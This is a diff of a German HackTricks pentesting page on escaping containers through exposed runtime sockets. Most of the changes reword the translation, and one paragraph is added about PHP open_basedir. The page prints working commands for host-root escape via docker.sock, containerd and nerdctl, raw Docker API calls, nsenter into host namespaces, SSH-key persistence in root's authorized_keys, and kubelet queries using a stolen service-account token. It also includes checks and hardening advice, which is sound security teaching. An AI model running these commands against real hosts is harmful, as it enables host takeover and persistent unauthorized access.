@@ -2,19 +2,19 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Überblick
+## Übersicht
 
-Viele reale Container-Kompromittierungen beginnen gar nicht mit einem namespace escape. Sie beginnen mit dem Zugriff auf die Runtime-Kontrollebene. Kann ein Workload über einen eingebundenen Unix-Socket oder einen exponierten TCP-Listener mit `dockerd`, `containerd`, CRI-O, Podman oder kubelet kommunizieren, kann der Angreifer möglicherweise einen neuen Container mit erweiterten Privilegien anfordern, das Host-Dateisystem einbinden, Host-Namespaces beitreten oder sensible Informationen über den Node abrufen. In solchen Fällen ist die Runtime-API die eigentliche Sicherheitsgrenze, und ihre Kompromittierung kommt praktisch einer Kompromittierung des Hosts gleich.
+Viele reale Container-Kompromittierungen beginnen überhaupt nicht mit einem Namespace-Escape. Sie beginnen mit Zugriff auf die Runtime-Steuerungsebene. Kann eine Workload über einen eingebundenen Unix-Socket oder einen exponierten TCP-Listener mit `dockerd`, `containerd`, CRI-O, Podman oder kubelet kommunizieren, kann der Angreifer möglicherweise einen neuen Container mit höheren Berechtigungen anfordern, das Host-Dateisystem einbinden, Host-Namespaces beitreten oder sensible Node-Informationen abrufen. In diesen Fällen ist die Runtime-API die eigentliche Sicherheitsgrenze, und ihre Kompromittierung kommt funktional einer Kompromittierung des Hosts nahe.
 
-Deshalb sollte die Offenlegung von Runtime-Sockets getrennt von Kernel-Schutzmaßnahmen dokumentiert werden. Ein Container mit gewöhnlichem seccomp, Capabilities und MAC-Einschränkungen kann immer noch nur einen API-Aufruf von der Kompromittierung des Hosts entfernt sein, wenn `/var/run/docker.sock` oder `/run/containerd/containerd.sock` in ihn eingebunden ist. Die Kernel-Isolation des aktuellen Containers kann genau wie vorgesehen funktionieren, während die Runtime-Verwaltungsebene weiterhin vollständig exponiert ist.
+Deshalb sollte die Exposition von Runtime-Sockets getrennt von Kernel-Schutzmaßnahmen dokumentiert werden. Ein Container mit gewöhnlichem seccomp, Capabilities und MAC-Einschränkungen kann dennoch nur einen API-Aufruf von einer Host-Kompromittierung entfernt sein, wenn `/var/run/docker.sock` oder `/run/containerd/containerd.sock` in ihn eingebunden ist. Die Kernel-Isolation des aktuellen Containers kann genau wie vorgesehen funktionieren, während die Runtime-Verwaltungsebene weiterhin vollständig exponiert ist.
 
 ## Zugriffsmodelle für Daemons
 
-Docker Engine stellt seine privilegierte API traditionell über den lokalen Unix-Socket `unix:///var/run/docker.sock` bereit. Historisch wurde sie auch über TCP-Listener wie `tcp://0.0.0.0:2375` oder einen TLS-geschützten Listener auf `2376` remote verfügbar gemacht. Wird der Daemon remote ohne starkes TLS und Client-Authentifizierung exponiert, wird die Docker-API effektiv zu einer Remote-Root-Schnittstelle.
+Docker Engine stellt seine privilegierte API traditionell über den lokalen Unix-Socket `unix:///var/run/docker.sock` bereit. Historisch wurde sie auch remote über TCP-Listener wie `tcp://0.0.0.0:2375` oder einen TLS-geschützten Listener auf `2376` exponiert. Wird der Daemon ohne starkes TLS und Client-Authentifizierung remote exponiert, wird die Docker-API praktisch zu einer Remote-root-Schnittstelle.
 
-containerd, CRI-O, Podman und kubelet exponieren ähnlich weitreichende Angriffsflächen. Namen und Workflows unterscheiden sich, die Logik jedoch nicht. Ermöglicht die Schnittstelle dem Aufrufer, Workloads zu erstellen, Host-Pfade einzubinden, Zugangsdaten abzurufen oder laufende Container zu ändern, handelt es sich um einen privilegierten Verwaltungskanal, der entsprechend behandelt werden sollte.
+containerd, CRI-O, Podman und kubelet exponieren ähnliche Angriffsflächen mit weitreichenden Auswirkungen. Die Namen und Abläufe unterscheiden sich, die Logik jedoch nicht. Ermöglicht die Schnittstelle dem Aufrufer, Workloads zu erstellen, Host-Pfade einzubinden, Zugangsdaten abzurufen oder laufende Container zu ändern, handelt es sich um einen privilegierten Verwaltungskanal, der entsprechend behandelt werden sollte.
 
-Eine Web-UI für die Containerverwaltung kann dieselbe Sicherheitsgrenze exponieren, ohne dem lokalen Konto direkten Socket-Zugriff zu gewähren. Beispielsweise dokumentierte [Portainer issue #493](https://github.com/portainer/portainer/issues/493) das Zurücksetzen eines Administratorpassworts ohne Authentifizierung in einem älteren Build von Version 1.11.1. Betrachte eine lokal erreichbare UI nur als Ansatzpunkt für eine Prüfung: Bestätige den installierten Build und das Authentifizierungsverhalten, die tatsächlichen Administratorrechte und ob der verwaltete Endpunkt Container mit einem beschreibbaren Host-Bind-Mount erstellen kann. [Portainer documents](https://docs.portainer.io/admin/environments/add/docker/socket), dass die socketbasierte Verwaltung Zugriff auf den Docker-Socket erfordert; ein rootless oder eingeschränkter Endpunkt verändert die Auswirkungen auf den Host. Leite den Authentifizierungsfehler oder Root-Zugriff auf den Host nicht allein aus einem Prozessnamen, Port oder Versionsstring ab.
+Eine Weboberfläche zur Containerverwaltung kann dieselbe Grenze exponieren, ohne dem lokalen Konto direkten Socket-Zugriff zu gewähren. So dokumentierte [Portainer issue #493](https://github.com/portainer/portainer/issues/493) das Zurücksetzen des Administratorpassworts ohne Authentifizierung in einem älteren Build von Version 1.11.1. Betrachte eine lokal erreichbare UI lediglich als Ansatzpunkt für eine Überprüfung: Prüfe den installierten Build und das Authentifizierungsverhalten, die tatsächliche Administrator-Kontrolle sowie, ob der verwaltete Endpoint Container mit einem beschreibbaren Host-Bind-Mount erstellen kann. [Portainer documents](https://docs.portainer.io/admin/environments/add/docker/socket), dass socketbasierte Verwaltung Zugriff auf den Docker-Socket erfordert; ein rootless oder eingeschränkter Endpoint verändert die Auswirkungen auf den Host. Leite den Authentifizierungsfehler oder den Zugriff auf Host-root nicht allein aus einem Prozessnamen, Port oder Versionsstring ab.
 
 Häufige lokale Pfade, die überprüft werden sollten, sind:
 
@@ -29,11 +29,11 @@ Häufige lokale Pfade, die überprüft werden sollten, sind:
 /run/firecracker-containerd.sock
 ```
 
-Ältere oder speziellere Stacks können auch Endpoints wie `dockershim.sock`, `frakti.sock` oder `rktlet.sock` bereitstellen. Diese sind in modernen Umgebungen weniger verbreitet. Wenn sie jedoch vorkommen, sollten sie mit derselben Vorsicht behandelt werden, da sie Runtime-Steuerungsschnittstellen und keine gewöhnlichen Anwendungssockets darstellen.
+Ältere oder stärker spezialisierte Stacks können auch Endpunkte wie `dockershim.sock`, `frakti.sock` oder `rktlet.sock` bereitstellen. Diese sind in modernen Umgebungen weniger verbreitet. Wenn sie jedoch vorkommen, sollten sie mit derselben Vorsicht behandelt werden, da sie Runtime-Steuerungsschnittstellen und keine gewöhnlichen Anwendungssockets darstellen.
 
-## Secure Remote Access
+## Sicherer Fernzugriff
 
-Wenn ein Daemon über den lokalen Socket hinaus erreichbar sein muss, sollte die Verbindung mit TLS geschützt und vorzugsweise gegenseitig authentifiziert werden, sodass der Daemon den Client und der Client den Daemon verifiziert. Die alte Gewohnheit, den Docker-Daemon der Einfachheit halber über einfaches HTTP zu öffnen, ist einer der gefährlichsten Fehler bei der Containerverwaltung, da die API leistungsfähig genug ist, um direkt privilegierte Container zu erstellen.
+Wenn ein Daemon über den lokalen Socket hinaus erreichbar sein muss, sollte die Verbindung mit TLS geschützt werden, vorzugsweise mit gegenseitiger Authentifizierung, sodass der Daemon den Client und der Client den Daemon verifiziert. Die alte Gewohnheit, den Docker-Daemon der Einfachheit halber über unverschlüsseltes HTTP bereitzustellen, ist einer der gefährlichsten Fehler bei der Containerverwaltung, da die API leistungsfähig genug ist, um direkt privilegierte Container zu erstellen.
 
 Das historische Docker-Konfigurationsmuster sah so aus:
 
@@ -42,7 +42,7 @@ DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
 sudo service docker restart
 ```
 
-Auf systemd-basierten Hosts kann die Daemon-Kommunikation auch als `fd://` erscheinen. Das bedeutet, dass der Prozess einen von systemd vorab geöffneten Socket übernimmt, statt selbst direkt daran zu binden. Entscheidend ist nicht die genaue Syntax, sondern die Sicherheitsauswirkung. Sobald der Daemon über einen streng berechtigten lokalen Socket hinaus lauscht, sind Transportsicherheit und Client-Authentifizierung zwingend erforderlich und keine optionale Härtungsmaßnahme mehr.
+Auf systemd-basierten Hosts kann die Daemon-Kommunikation auch als `fd://` erscheinen. Das bedeutet, dass der Prozess einen bereits von systemd geöffneten Socket übernimmt, anstatt selbst direkt daran zu binden. Die wichtige Lehre ist nicht die genaue Syntax, sondern die sicherheitsrelevante Konsequenz. Sobald der Daemon über einen Socket lauscht, dessen Zugriff nicht eng beschränkt ist, werden Transportsicherheit und Client-Authentifizierung zwingend erforderlich und sind keine optionale Härtung mehr.
 
 ## Missbrauch
 
@@ -60,11 +60,11 @@ crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
 buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
 ```
 
-Diese Befehle sind nützlich, weil sie zwischen einem nicht vorhandenen Pfad, einem eingebundenen, aber nicht zugänglichen Socket und einer aktiven privilegierten API unterscheiden. Wenn der Client funktioniert, stellt sich als Nächstes die Frage, ob die API einen neuen Container mit einem Host-Bind-Mount oder gemeinsam genutzten Host-Namespaces starten kann.
+Diese Befehle sind nützlich, weil sie zwischen einem nicht erreichbaren Pfad, einem eingebundenen, aber nicht zugänglichen Socket und einer aktiven privilegierten API unterscheiden. Wenn der Client erfolgreich ist, stellt sich als Nächstes die Frage, ob die API einen neuen Container mit einem Host-Bind-Mount oder gemeinsam genutztem Host-Namespace starten kann.
 
 ### Wenn kein Client installiert ist
 
-Dass `docker`, `podman` oder eine andere benutzerfreundliche CLI fehlt, bedeutet nicht, dass der Socket sicher ist. Docker Engine kommuniziert über seinen Unix-Socket per HTTP, und Podman stellt über `podman system service` sowohl eine Docker-kompatible API als auch eine native Libpod-API bereit. Daher reicht möglicherweise schon eine minimale Umgebung mit nur `curl`, um den Daemon anzusteuern:
+Dass `docker`, `podman` oder eine andere benutzerfreundliche CLI fehlt, bedeutet nicht, dass der Socket sicher ist. Docker Engine kommuniziert über HTTP auf seinem Unix-Socket, und Podman stellt sowohl eine Docker-kompatible API als auch eine native Libpod-API über `podman system service` bereit. Das bedeutet, dass eine minimale Umgebung, in der nur `curl` vorhanden ist, möglicherweise ausreicht, um den Daemon zu steuern:
 
 ```bash
 curl --unix-socket /var/run/docker.sock http://localhost/_ping
@@ -78,33 +78,35 @@ curl --unix-socket /run/podman/podman.sock http://d/_ping
 curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
 ```
 
-Dies ist während der post-exploitation relevant, da Verteidiger manchmal die üblichen Client-Binaries entfernen, aber den Management-Socket gemountet lassen. Auf Podman-Hosts gilt: Der Pfad mit hohem Wert unterscheidet sich bei rootful- und rootless-Bereitstellungen: `unix:///run/podman/podman.sock` für rootful-Service-Instanzen und `unix://$XDG_RUNTIME_DIR/podman/podman.sock` für rootless-Instanzen.
+Bei PHP-Codeausführung mit `open_basedir`-Einschränkungen bleiben [Unix-Socket-Verbindungen ein separater Weg](../../../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/#unix-sockets-outside-open_basedir), sofern der PHP-Prozess die OS-Berechtigung zum Verbinden hat.
 
-### Vollständiges Beispiel: Vom Docker-Socket zu Root auf dem Host
+Das ist während der post-exploitation relevant, weil Verteidiger manchmal die üblichen Client-Binaries entfernen, den Management-Socket aber eingebunden lassen. Auf Podman-Hosts solltest du beachten, dass sich der Pfad mit hohem Wert bei rootful- und rootless-Bereitstellungen unterscheidet: `unix:///run/podman/podman.sock` für rootful-Dienstinstanzen und `unix://$XDG_RUNTIME_DIR/podman/podman.sock` für rootless-Instanzen.
 
-Wenn `docker.sock` erreichbar ist, besteht der klassische Escape darin, einen neuen Container zu starten, der das Root-Dateisystem des Hosts mountet, und dann mit `chroot` dorthin zu wechseln:
+### Vollständiges Beispiel: Vom Docker-Socket zu Host-Root
+
+Wenn `docker.sock` erreichbar ist, besteht der klassische Escape darin, einen neuen Container zu starten, der das Root-Dateisystem des Hosts einbindet, und anschließend mit `chroot` dorthin zu wechseln:
 
 ```bash
 docker -H unix:///var/run/docker.sock images
 docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
 ```
 
-Dies ermöglicht direkte Ausführung mit Host-root-Rechten über den Docker daemon. Die Auswirkungen beschränken sich nicht auf das Lesen von Dateien. Sobald der Angreifer im neuen Container ist, kann er Host-Dateien verändern, Zugangsdaten abgreifen, Persistenz einrichten oder weitere privilegierte Workloads starten.
+Dies ermöglicht die direkte Ausführung mit Host-root-Rechten über den Docker-Daemon. Die Auswirkungen beschränken sich nicht auf das Lesen von Dateien. Im neuen Container kann der Angreifer Host-Dateien verändern, Zugangsdaten abgreifen, Persistenz einrichten oder weitere privilegierte Workloads starten.
 
-### Vollständiges Beispiel: Vom Docker Socket zu Host-Namespaces
+### Vollständiges Beispiel: Vom Docker-Socket zu Host-Namespaces
 
-Wenn der Angreifer statt reinem Dateisystemzugriff lieber in Namespaces eintreten möchte:
+Wenn der Angreifer statt eines reinen Dateisystemzugriffs lieber in Namespaces eintritt:
 
 ```bash
 docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
 nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 ```
 
-Dieser Pfad erreicht den Host, indem die Runtime aufgefordert wird, einen neuen Container mit explizitem Zugriff auf Host-Namespaces zu erstellen, statt den aktuellen Container auszunutzen.
+Dieser Pfad erreicht den Host, indem die Runtime angewiesen wird, einen neuen Container mit expliziter Freigabe von Host-Namespaces zu erstellen, statt den aktuellen Container auszunutzen.
 
 ### Docker Socket Persistence Pattern
 
-Runtime-Steuerung kann auch zur Persistenz statt für eine einmalige Shell verwendet werden. Das generische Muster besteht darin, einen Helper-Container mit einem Host-Mount zu erstellen, autorisiertes Zugriffsmaterial oder einen Startup-Hook in das gemountete Host-Dateisystem zu schreiben und anschließend zu überprüfen, ob der Host es verwendet.
+Die Runtime-Kontrolle kann auch zur Persistenz statt für eine einmalige Shell verwendet werden. Das allgemeine Muster besteht darin, einen Hilfscontainer mit einem Host-Mount zu erstellen, autorisiertes Zugriffsmaterial oder einen Startup-Hook in das eingebundene Host-Dateisystem zu schreiben und anschließend zu überprüfen, ob der Host dieses übernimmt.
 
 Beispielaufbau:
 
@@ -115,11 +117,11 @@ docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
 docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
 ```
 
-Dieselbe Idee kann je nach gewünschtem Nachweis auf systemd-Units, cron-Fragmente, Anwendungsstartdateien oder SSH-Schlüssel abzielen. Wichtig ist, dass die persistente Änderung über die Dateisystemberechtigungen des Runtime-Daemons auf Host-Ebene vorgenommen wird und nicht durch zusätzliche Privilegien im ursprünglichen Container.
+Dieselbe Idee kann je nach gewünschtem Nachweis auf systemd-Units, Cron-Fragmente, Anwendungsstartdateien oder SSH-Schlüssel abzielen. Wichtig ist, dass die dauerhafte Änderung über die Dateisystemberechtigungen des Runtime-Daemons auf Hostebene vorgenommen wird und nicht durch zusätzliche Berechtigungen im ursprünglichen Container.
 
-### Pivot über einen Helper und die direkte Docker-API
+### Raw Docker API Helper Pivot
 
-Wenn die Docker-CLI fehlt, lässt sich derselbe Host-Mount-Helper-Ablauf über HTTP über den Unix-Socket ausführen. Der allgemeine Ablauf ist: API bestätigen, einen Helper-Container mit einem Host-Bind-Mount erstellen, ihn starten, eine Exec-Instanz erstellen und diese Exec-Instanz starten.
+Wenn die Docker-CLI fehlt, lässt sich derselbe Host-Mount-Helper-Ablauf über HTTP auf dem Unix-Socket ausführen. Der allgemeine Ablauf ist: API bestätigen, einen Helper-Container mit einem Host-Bind-Mount erstellen, ihn starten, eine Exec-Instanz erstellen und diese Exec-Instanz starten.
 
 ```bash
 curl --unix-socket /var/run/docker.sock http://localhost/_ping
@@ -134,7 +136,7 @@ curl --unix-socket /var/run/docker.sock \
   -X POST http://localhost/v1.54/containers/helper/exec
 ```
 
-Die abschließende Anfrage an `/exec/<id>/start` hängt von der zurückgegebenen Exec-ID ab. Der sicherheitsrelevante Punkt ist jedoch unabhängig von der genauen JSON-Verarbeitung: Der direkte API-Zugriff auf einen rootful Docker-Daemon reicht aus, um eine leistungsfähigere Hilfs-Workload anzufordern.
+Die abschließende Anfrage an `/exec/<id>/start` hängt von der zurückgegebenen Exec-ID ab, aber der sicherheitsrelevante Punkt ist unabhängig von der genauen JSON-Verarbeitung: Der direkte API-Zugriff auf einen rootful Docker-Daemon reicht aus, um eine leistungsfähigere Hilfs-Workload anzufordern.
 
 ### Vollständiges Beispiel: containerd-Socket
 
@@ -146,7 +148,7 @@ ctr --address /run/containerd/containerd.sock run --tty --privileged --mount typ
 chroot /host /bin/sh
 ```
 
-Wenn ein Docker-ähnlicherer Client verfügbar ist, kann `nerdctl` praktischer als `ctr` sein, da es vertraute Flags wie `--privileged`, `--pid=host` und `-v` unterstützt:
+Wenn ein Docker-ähnlicher Client verfügbar ist, kann `nerdctl` praktischer sein als `ctr`, da es vertraute Flags wie `--privileged`, `--pid=host` und `-v` bereitstellt:
 
 ```bash
 nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
@@ -154,11 +156,11 @@ nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -i
 chroot /host /bin/sh
 ```
 
-Die Auswirkungen sind erneut eine Host-Kompromittierung. Selbst wenn Docker-spezifische Tools fehlen, kann eine andere Runtime-API weiterhin dieselben administrativen Möglichkeiten bieten. Auf Kubernetes-Knoten kann `crictl` für Reconnaissance und die Interaktion mit Containern ebenfalls ausreichen, da es direkt mit dem CRI-Endpunkt kommuniziert.
+Die Auswirkungen sind erneut eine Host-Kompromittierung. Selbst wenn Docker-spezifische Tools fehlen, kann eine andere Runtime-API dieselben administrativen Möglichkeiten bieten. Auf Kubernetes-Knoten kann `crictl` für die Aufklärung und Interaktion mit Containern ebenfalls ausreichen, da es direkt mit dem CRI-Endpunkt kommuniziert.
 
 ### BuildKit-Socket
 
-`buildkitd` wird leicht übersehen, weil viele es für „nur das Build-Backend“ halten, doch der Daemon ist weiterhin eine privilegierte Control Plane. Ein erreichbarer `buildkitd.sock` kann einem Angreifer ermöglichen, beliebige Build-Schritte auszuführen, die Fähigkeiten der Worker zu untersuchen, lokale Kontexte aus der kompromittierten Umgebung zu verwenden und gefährliche Berechtigungen wie `network.host` oder `security.insecure` anzufordern, sofern der Daemon so konfiguriert wurde, dass er diese zulässt.
+`buildkitd` wird leicht übersehen, weil viele es für „nur das Build-Backend“ halten. Der Daemon ist jedoch weiterhin eine privilegierte Steuerungsebene. Ein erreichbarer `buildkitd.sock` kann einem Angreifer ermöglichen, beliebige Build-Schritte auszuführen, die Fähigkeiten des Workers zu untersuchen, lokale Kontexte aus der kompromittierten Umgebung zu verwenden und gefährliche Entitlements wie `network.host` oder `security.insecure` anzufordern, sofern der Daemon entsprechend konfiguriert wurde.
 
 Nützliche erste Interaktionen sind:
 
@@ -167,7 +169,7 @@ buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
 buildctl --addr unix:///run/buildkit/buildkitd.sock du
 ```
 
-Wenn der Daemon Build-Anfragen akzeptiert, teste, ob unsichere Entitlements verfügbar sind:
+Wenn der Daemon Build-Anfragen akzeptiert, testen Sie, ob unsichere Entitlements verfügbar sind:
 
 ```bash
 buildctl --addr unix:///run/buildkit/buildkitd.sock build \
@@ -179,13 +181,13 @@ buildctl --addr unix:///run/buildkit/buildkitd.sock build \
   --output type=local,dest=/tmp/buildkit-out
 ```
 
-Die konkreten Auswirkungen hängen von der Daemon-Konfiguration ab, aber ein rootful BuildKit-Service mit permissiven Entitlements ist keine harmlose Entwickler-Bequemlichkeit. Behandle ihn als weitere hochwertige administrative Angriffsfläche, besonders auf CI-Runnern und gemeinsam genutzten Build-Knoten.
+Die genauen Auswirkungen hängen von der Daemon-Konfiguration ab, aber ein rootful BuildKit-Service mit permissiven Berechtigungen ist keine harmlose Entwickler-Bequemlichkeit. Behandle ihn als weitere hochwertige administrative Angriffsfläche, insbesondere auf CI-Runnern und gemeinsam genutzten Build-Nodes.
 
 ### Kubelet-API über TCP
 
-Der kubelet ist keine Container-Runtime, aber dennoch Teil der Node-Management-Ebene und wird häufig im selben Vertrauensgrenzen-Kontext betrachtet. Wenn der sichere Port `10250` des kubelet aus dem Workload erreichbar ist oder Node-Credentials, kubeconfigs oder Proxy-Rechte offengelegt werden, kann der Angreifer möglicherweise Pods auflisten, Logs abrufen oder Befehle in node-lokalen Containern ausführen, ohne jemals den Admission-Pfad des Kubernetes-API-Servers zu durchlaufen.
+Der Kubelet ist keine Container-Runtime, gehört aber weiterhin zur Node-Verwaltungsebene und fällt oft unter dieselbe Diskussion über Vertrauensgrenzen. Wenn der sichere Kubelet-Port `10250` aus dem Workload erreichbar ist oder Node-Credentials, kubeconfigs oder Proxy-Rechte offengelegt werden, kann der Angreifer möglicherweise Pods auflisten, Logs abrufen oder Befehle in Node-lokalen Containern ausführen, ohne jemals den Admission-Pfad des Kubernetes-API-Servers zu berühren.
 
-Beginne mit einer einfachen Erkundung:
+Beginne mit einer schnellen Erkundung:
 
 ```bash
 curl -sk https://127.0.0.1:10250/pods
@@ -194,11 +196,11 @@ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
 curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
 ```
 
-Wenn der kubelet- oder API-Server-Proxy-Pfad `exec` autorisiert, kann ein WebSocket-fähiger Client dadurch Code in anderen Containern auf dem Node ausführen. Deshalb ist `nodes/proxy` mit nur `get`-Berechtigung gefährlicher, als es klingt: Die Anfrage kann weiterhin kubelet-Endpunkte erreichen, die Befehle ausführen, und diese direkten kubelet-Interaktionen tauchen nicht in den normalen Kubernetes-Audit-Logs auf.<sup>[[2]](#references)</sup>
+Wenn der kubelet- oder API-server-Proxy-Pfad `exec` autorisiert, kann ein WebSocket-fähiger Client damit Code in anderen Containern auf dem Node ausführen. Deshalb ist auch `nodes/proxy` mit ausschließlich `get`-Berechtigung gefährlicher, als es klingt: Die Anfrage kann weiterhin kubelet-Endpunkte erreichen, die Befehle ausführen, und diese direkten Interaktionen mit kubelet tauchen nicht in normalen Kubernetes-Audit-Logs auf.<sup>[[2]](#references)</sup>
 
 ## Prüfungen
 
-Mit diesen Prüfungen soll ermittelt werden, ob der Container eine Management Plane erreichen kann, die außerhalb der Vertrauensgrenze bleiben sollte.
+Mit diesen Prüfungen soll festgestellt werden, ob der Container eine Management-Ebene erreichen kann, die außerhalb der Vertrauensgrenze bleiben sollte.
 
 ```bash
 mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
@@ -209,22 +211,24 @@ find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' 
 
 Was hier interessant ist:
 
-- Ein eingebundener Runtime-Socket ist normalerweise ein direktes Administrationsmittel und nicht bloß eine Möglichkeit zur Offenlegung von Informationen.
+- Ein eingebundener Runtime-Socket ist in der Regel eine direkte administrative Zugriffsmöglichkeit und nicht bloß eine Offenlegung von Informationen.
 - Ein TCP-Listener auf `2375` ohne TLS sollte als Bedingung für eine Remote-Kompromittierung behandelt werden.
-- Umgebungsvariablen wie `DOCKER_HOST` weisen oft darauf hin, dass der Workload absichtlich für die Kommunikation mit der Host-Runtime ausgelegt wurde.
+- Umgebungsvariablen wie `DOCKER_HOST` weisen oft darauf hin, dass der Workload bewusst für die Kommunikation mit der Host-Runtime konzipiert wurde.
 
 ## Runtime-Standardeinstellungen
 
 | Runtime / Plattform | Standardzustand | Standardverhalten | Häufige manuelle Abschwächungen |
 | --- | --- | --- | --- |
-| Docker Engine | Standardmäßig lokaler Unix-Socket | `dockerd` lauscht am lokalen Socket, und der Daemon läuft normalerweise rootful | `/var/run/docker.sock` einbinden, `tcp://...:2375` exponieren, schwaches oder fehlendes TLS auf `2376` |
-| Podman | Standardmäßig daemonlose CLI | Für die gewöhnliche lokale Nutzung ist kein dauerhaft laufender privilegierter Daemon erforderlich; API-Sockets können dennoch exponiert werden, wenn `podman system service` aktiviert ist | `podman.sock` exponieren, den Dienst allgemein zugänglich machen, rootful API-Nutzung |
-| containerd | Lokaler privilegierter Socket | Die administrative API wird über den lokalen Socket exponiert und normalerweise von übergeordneten Tools genutzt | `containerd.sock` einbinden, breiter Zugriff auf `ctr` oder `nerdctl`, privilegierte Namespaces exponieren |
-| CRI-O | Lokaler privilegierter Socket | Der CRI-Endpunkt ist für vertrauenswürdige node-lokale Komponenten vorgesehen | `crio.sock` einbinden, den CRI-Endpunkt für nicht vertrauenswürdige Workloads exponieren |
-| Kubernetes kubelet | Node-lokale Management-API | Der Kubelet sollte nicht allgemein aus Pods erreichbar sein; je nach Authentifizierung und Autorisierung kann der Zugriff Pod-Zustand, Zugangsdaten und Ausführungsfunktionen offenlegen | Kubelet-Sockets oder -Zertifikate einbinden, schwache Kubelet-Authentifizierung, Host-Netzwerkmodus plus erreichbarer Kubelet-Endpunkt |
+| Docker Engine | Standardmäßig lokaler Unix-Socket | `dockerd` lauscht auf dem lokalen Socket und der Daemon läuft üblicherweise mit Root-Rechten | Einbinden von `/var/run/docker.sock`, Freigabe von `tcp://...:2375`, schwaches oder fehlendes TLS auf `2376` |
+| Podman | Standardmäßig Daemonless-CLI | Für die normale lokale Nutzung ist kein dauerhaft laufender privilegierter Daemon erforderlich; API-Sockets können dennoch freigegeben werden, wenn `podman system service` aktiviert ist | Freigabe von `podman.sock`, breit angelegter Betrieb des Dienstes, rootful API-Nutzung |
+| containerd | Lokaler privilegierter Socket | Administrative API über den lokalen Socket verfügbar gemacht und üblicherweise von übergeordneten Tools genutzt | Einbinden von `containerd.sock`, breiter Zugriff auf `ctr` oder `nerdctl`, Freigabe privilegierter Namespaces |
+| CRI-O | Lokaler privilegierter Socket | Der CRI-Endpunkt ist für vertrauenswürdige node-lokale Komponenten vorgesehen | Einbinden von `crio.sock`, Freigabe des CRI-Endpunkts für nicht vertrauenswürdige Workloads |
+| Kubernetes kubelet | Node-lokale Verwaltungs-API | Kubelet sollte aus Pods nicht allgemein erreichbar sein; je nach Authentifizierung und Autorisierung kann der Zugriff Pod-Zustände, Zugangsdaten und Ausführungsfunktionen offenlegen | Einbinden von kubelet-Sockets oder -Zertifikaten, schwache kubelet-Authentifizierung, Host-Netzwerkmodus mit erreichbarem kubelet-Endpunkt |
+
+
 
 ## References
 
 - [1] [Ausnutzung des containerd-Sockets, Teil 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
-- [2] [Risiken durch Umgehung des Kubernetes API Servers](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
+- [2] [Risiken von Umgehungen des Kubernetes API Servers](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
 {{#include ../../../banners/hacktricks-training.md}}
